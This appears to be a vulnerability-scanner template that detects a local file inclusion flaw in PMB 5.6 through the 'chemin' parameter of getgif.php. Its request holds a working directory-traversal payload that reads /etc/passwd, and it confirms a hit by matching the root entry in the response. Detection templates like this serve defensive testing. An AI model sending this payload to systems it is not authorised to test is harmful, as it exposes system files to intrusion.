id: "pmb-directory-traversal"
name: "PMB 5.6 - Local File Inclusion"
severity: "high"
description: "PMB 5.6 is vulnerable to local file inclusion because the PMB Gif Image is not sanitizing the content of the 'chemin' parameter."
tech:
  - "php"
tags:
  - "lfi"
  - "packetstorm"
  - "vuln"
cwe: "CWE-22"
reference: "https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html"
spaExclusion: true
request:
  method: "GET"
  path: "/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:.*:0:0:"
  - type: "status"
    status:
      - 200
